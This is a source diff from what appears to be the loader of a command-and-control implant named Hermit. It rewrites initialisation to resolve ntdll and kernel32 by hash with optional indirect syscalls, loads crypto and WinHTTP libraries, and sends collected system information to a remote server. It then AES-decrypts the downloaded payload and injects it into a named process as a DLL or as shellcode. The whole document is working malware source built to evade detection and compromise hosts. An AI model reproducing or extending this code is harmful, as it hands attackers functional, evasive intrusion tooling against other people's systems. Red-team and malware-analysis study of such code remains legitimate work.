@@ -4,38 +4,118 @@ namespace Hermit
 {
     State::PSTATE Init()
     {
-        // Load modules for dynamac API resolution.
-        HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
-        if (!hNTDLL)
-        {
-			return nullptr;
-        }
-        HMODULE hKernel32DLL = LoadLibrary(L"kernel32.dll");
-        if (!hKernel32DLL)
-        {
-            return nullptr;
-        }
-        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
-        if (!hWinHTTPDLL)
-        {
-			FreeLibrary(hNTDLL);
-            return nullptr;
-        }
-    
         State::PSTATE pState = new State::STATE;
 
+        pState->pTeb = NtCurrentTeb();
+
         #ifdef PAYLOAD_INDIRECT_SYSCALLS
-		pState->bIndirectSyscalls	        = TRUE;
+		pState->bIndirectSyscalls = TRUE;
         #else
-        pState->bIndirectSyscalls           = FALSE;
+        pState->bIndirectSyscalls = FALSE;
         #endif
 
-		pState->pCrypt				        = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
-		// pState->pTeb 				        = NtCurrentTeb();
-        pState->hKernel32DLL                = hKernel32DLL;
-		pState->hNTDLL				        = hNTDLL;
-		pState->hWinHTTPDLL			        = hWinHTTPDLL;
-		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hKernel32DLL, hWinHTTPDLL, pState->bIndirectSyscalls);
+        Procs::PPROCS pProcs = new Procs::PROCS;
+
+        // --------------------------------------------------------------------------
+        // Get module handlers and functions
+        // --------------------------------------------------------------------------
+
+        Modules::PMODULES pModules = new Modules::MODULES;
+
+        HMODULE hNtdll = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_NTDLL);
+        if (!hNtdll)
+        {
+            return nullptr;
+        }
+        pModules->hNtdll = hNtdll;
+
+        HMODULE hKernel32 = (HMODULE)Modules::GetModuleByHash(HASH_MODULE_KERNEL32);
+        if (!hKernel32)
+        {
+            FreeLibrary(hNtdll);
+            return nullptr;
+        }
+        pModules->hKernel32 = hKernel32;
+
+        // Get functions
+        Procs::FindProcs(
+            pProcs,
+            hNtdll,
+            hKernel32,
+            pState->bIndirectSyscalls
+        );
+
+        // --------------------------------------------------------------------------
+        // Get module handlers and functions
+        // --------------------------------------------------------------------------
+        
+        WCHAR wAdvapi32[] = L"advapi32.dll";
+        HMODULE hAdvapi32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wAdvapi32);
+        if (!hAdvapi32)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hAdvapi32 = hAdvapi32;
+
+        WCHAR wBcrypt[] = L"bcrypt.dll";
+        HMODULE hBcrypt = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wBcrypt);
+        if (!hBcrypt)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hBcrypt = hBcrypt;
+
+        WCHAR wCrypt32[] = L"crypt32.dll";
+        HMODULE hCrypt32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wCrypt32);
+        if (!hCrypt32)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hCrypt32 = hCrypt32;
+
+        WCHAR wUser32[] = L"user32.dll";
+        HMODULE hUser32 = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wUser32);
+        if (!hUser32)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hUser32 = hUser32;
+
+        WCHAR wWinHttp[] = L"winhttp.dll";
+        HMODULE hWinHttp = (HMODULE)Modules::LoadModule(pProcs, (LPWSTR)wWinHttp);
+        if (!hWinHttp)
+        {
+			FreeLibrary(hNtdll);
+			FreeLibrary(hKernel32);
+            return nullptr;
+        }
+        pModules->hWinHttp = hWinHttp;
+
+        // Get functions
+        Procs::FindProcsMisc(
+            pProcs,
+            hAdvapi32,
+            hBcrypt,
+            hCrypt32,
+            hUser32,
+            hWinHttp
+        );
+
+        // --------------------------------------------------------------------------
+        // Store other states
+        // --------------------------------------------------------------------------
+
+        pState->pModules                    = pModules;
+        pState->pProcs                      = pProcs;
+		pState->pCrypt				        = Crypt::InitCrypt(pProcs, AES_KEY_BASE64_W, AES_IV_BASE64_W);
 		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
 		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
         pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
@@ -48,8 +128,9 @@ namespace Hermit
 		pState->hRequest 			        = nullptr;
 		// pState->pSocket 			        = nullptr;
 
-		// Get system information
-		Handler::GetInitialInfoJSON(pState);
+        // --------------------------------------------------------------------------
+        // Initialize WinHttp handlers
+        // --------------------------------------------------------------------------
 
 		Handler::HTTPInit(pState);
 		if (pState->hSession == nullptr || pState->hConnect == nullptr)
@@ -63,7 +144,9 @@ namespace Hermit
 
     std::vector<BYTE> Download(State::PSTATE pState)
     {
-        std::string sInfoJSON = Utils::Convert::UTF8Encode(std::wstring(pState->lpInfoJSON));
+        // Get system information
+		std::wstring wInfoJSON = Handler::GetInitialInfoJSON(pState);
+        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
 
         System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
@@ -88,7 +171,12 @@ namespace Hermit
         }
 
         // Decrypt the data
-        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pState->pCrypt->pAES->hKey, pState->pCrypt->pAES->iv);
+        std::vector<BYTE> bytes = Crypt::Decrypt(
+            pState->pProcs,
+            wEnc,
+            pState->pCrypt->pAES->hKey,
+            pState->pCrypt->pAES->iv
+        );
         return bytes;
     }
 
@@ -114,7 +202,10 @@ namespace Hermit
         }
 
         // Target PID to be injected DLL.
-        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+        DWORD dwTargetPID = System::Process::ProcessGetIdByName(
+            pState->pProcs,
+            pState->lpPayloadProcessToInject
+        );
 
         // Inject DLL
         if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
@@ -190,7 +281,10 @@ namespace Hermit
             return;
         }
 
-        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+        DWORD dwTargetPID = System::Process::ProcessGetIdByName(
+            pState->pProcs,
+            pState->lpPayloadProcessToInject
+        );
 
         // Inject shellcode
         if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
